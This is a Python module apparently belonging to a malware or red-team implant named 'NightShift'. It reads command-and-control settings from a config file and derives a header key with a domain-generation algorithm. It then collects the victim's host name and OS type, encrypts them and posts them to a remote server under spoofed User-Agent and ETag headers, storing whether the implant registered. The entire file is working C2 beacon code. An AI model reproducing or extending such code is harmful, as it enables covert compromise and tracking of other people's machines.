#!/usr/bin/env python
# -*- coding: utf-8 -*-

import aiohttp
import asyncio
import hashlib
import os
import sys
import json
import string
import socket

from nightshift_dga import NightShift_DGA
from nightshift_cipher import NightShift_Cipher

class NightShift_Init_Check():

    def ns_init_check(self):
        loop = asyncio.get_event_loop()
        ns_init_json_path = 'ns_init_call.json'
        ns_cconfig_read_path = 'ns_c_config.json'
        with open(ns_cconfig_read_path) as ns_cconfig_f:
            ns_cconfig_data = json.load(ns_cconfig_f)
            ns_getua_data = ns_cconfig_data.get('ns_get_ua')
            ns_postua_data = ns_cconfig_data.get('ns_post_ua')
            ns_initsite_data = ns_cconfig_data.get('ns_init_site')
            ns_initsitep_data = ns_cconfig_data.get('ns_init_site_p')
            ns_fofsite_data = ns_cconfig_data.get('ns_fof_site')
            ns_postsite_data = ns_cconfig_data.get('ns_post_site')
        if os.path.exists(ns_init_json_path):
            ns_f_check = True
            with open(ns_init_json_path) as ns_init_f:
                ns_init_data = json.load(ns_init_f)
                ns_host_data = ns_init_data.get('host_data')
                ns_w_check = ns_host_data.get('ns_init')
                if ns_f_check == True and ns_w_check == True:
                    # print("cool, let's go for a spin")
                    response = [ True, ns_getua_data, ns_postua_data, ns_fofsite_data, ns_postsite_data ]
                    return response
                else:
                    # print("well we have work to do")
                    response = loop.run_until_complete(self.ns_init_call(ns_init_json_path,ns_getua_data,ns_postua_data,ns_initsite_data,ns_initsitep_data))
                    return response, ns_getua_data, ns_postua_data, ns_fofsite_data, ns_postsite_data

        else:
            response = loop.run_until_complete(self.ns_init_call(ns_init_json_path,ns_getua_data,ns_postua_data,ns_initsite_data,ns_initsitep_data))
            return response, ns_getua_data, ns_postua_data, ns_fofsite_data, ns_postsite_data

    async def ns_init_call(self,ns_init_json_path,ns_getua_data,ns_postua_data,ns_initsite_data,ns_initsitep_data):
        ns_get_key = NightShift_DGA()
        ns_get_cipher = NightShift_Cipher()
        # Host Info
        ns_host_name_f = socket.gethostname()
        ns_os_type_f =  os.name
        ns_host_os_to_hash = str(ns_host_name_f + ns_os_type_f)
        ns_host_os_hashed_f = ns_get_cipher.hash_keys_hosts(ns_host_os_to_hash)
        # Server Contact Info
        ns_comms_chk_url = ns_initsite_data
        ns_post_url = ns_initsitep_data
        ns_hdr_key = ns_get_key.ns_dga_algorithm('key')
        ns_hash_key = ns_get_cipher.hash_keys_hosts(ns_hdr_key)
        ns_comms_hdr = {
                'User-Agent': ns_getua_data,
                'ETag': ns_hash_key
                }
        ns_post_hdr = {
                'User-Agent': ns_postua_data,
                'ETag': ns_hash_key
                }
        ns_init_f = True
        ns_init_config_f = { "host_data": { "os_type": ns_os_type_f, "host_name": ns_host_name_f, "ns_init": ns_init_f }, "host_hash": ns_host_os_hashed_f }
        ns_post_data = ns_get_cipher.encrypt(str(ns_init_config_f))
        try:
            async with aiohttp.ClientSession(trust_env=True) as session:
                async with session.get(ns_comms_chk_url, headers=ns_comms_hdr) as response:
                    ns_comms_html = await response.text()
                async with session.post(ns_post_url, headers=ns_post_hdr, data=ns_post_data) as response:
                    ns_post_init_html = await response.text()
                with open(ns_init_json_path, 'w') as ns_init_w:
                    if ns_comms_html == 'Test Sucessful' and ns_post_init_html == 'Initialization Complete, welcome to the nightshift.':
                        json.dump(ns_init_config_f, ns_init_w)
                    else:
                        ns_init_f = False
                        ns_init_config_f = { "host_data": { "os_type": ns_os_type_f, "host_name": ns_host_name_f, "ns_init": ns_init_f }, "host_hash": ns_host_os_hashed_f }
                        json.dump(ns_init_config_f, ns_init_w)                    
        except aiohttp.client_exceptions.ClientConnectorError:
            print("Connection has been refused", file=sys.stderr)
        return ns_init_f

    def run(self):
        ns_check = self.ns_init_check()
        return ns_check
        
if __name__ == "__main__":
    ns_check = NightShift_Init_Check().run()
    print('Here is the Night Shift init config check - {0}'.format(ns_check))
    sys.exit(0)
